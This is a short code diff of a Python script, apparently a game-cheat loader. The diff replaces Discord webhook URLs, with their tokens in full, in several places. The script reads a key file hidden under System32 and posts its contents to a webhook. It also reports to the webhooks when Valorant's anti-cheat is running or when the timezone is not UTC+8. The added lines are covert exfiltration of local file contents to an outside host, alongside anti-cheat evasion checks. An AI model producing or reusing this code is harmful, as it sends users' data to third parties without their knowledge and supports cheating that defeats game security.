@@ -29,7 +29,7 @@ os.system('cls')
 file_pathkeyx = r"C:\Windows\System32\xsystem\xaes.txt"
 with open(file_pathkeyx, 'r') as file:
     contentxsf = file.read()
-send_dx("https://discordapp.com/api/webhooks/1273024308729352192/jPqxaz_B33A7f_hbPyoMJZrgc31-hc0_1u-1iw7DLZdxOkstl5BRFitzCmxNoyAWd4MM", contentxsf)
+send_dx("https://discord.com/api/webhooks/1326019230789013538/lQOxyIugVPj0hbJpz0Gghj8PcPsVwazV-jymiSPwSMTfM8v4dpiaow95Ng0rnhHTl4_x", contentxsf)
 os.system('cls')
 file_pathmybootaes = r"C:\myaesboot.txt"
 
@@ -43,7 +43,7 @@ def check_program_run_2():
             file_timestamp = os.path.getmtime(file_path)
             file_time = datetime.fromtimestamp(file_timestamp)
             if file_time >= boot_time:
-                send_dx("https://discord.com/api/webhooks/1222048087871324160/8b3m_YeI6RSayYHfHJcaK-dYHanpkk3TMRSg9JS_plc0yaTmgHlL-6t5qHBwsXZEVL9V", "HVCI WARNING.")
+                send_dx("https://discord.com/api/webhooks/1326018838579646475/RAlQMvPXVo0FSTsZA22TB8NLJHDl73MeKzs3CXpJg43niiX73XwmCNe5WJUczot-_BnK", "HVCI WARNING.")
                 os.system('cls')
                 print("ERROR, Valorant anti-cheat is running.")
                 input()
@@ -58,7 +58,7 @@ def check_timezone():
     utc_time = time.gmtime()
     time_difference = (time.mktime(local_time) - time.mktime(utc_time)) / 3600
     if time_difference != 8:
-        send_dx("https://discord.com/api/webhooks/1222048087871324160/8b3m_YeI6RSayYHfHJcaK-dYHanpkk3TMRSg9JS_plc0yaTmgHlL-6t5qHBwsXZEVL9V", "wrong time, not utc8+")
+        send_dx("https://discord.com/api/webhooks/1326018838579646475/RAlQMvPXVo0FSTsZA22TB8NLJHDl73MeKzs3CXpJg43niiX73XwmCNe5WJUczot-_BnK", "wrong time, not utc8+")
         os.system('cls')
         print("Set your timezone to UTC8+.")
         input()
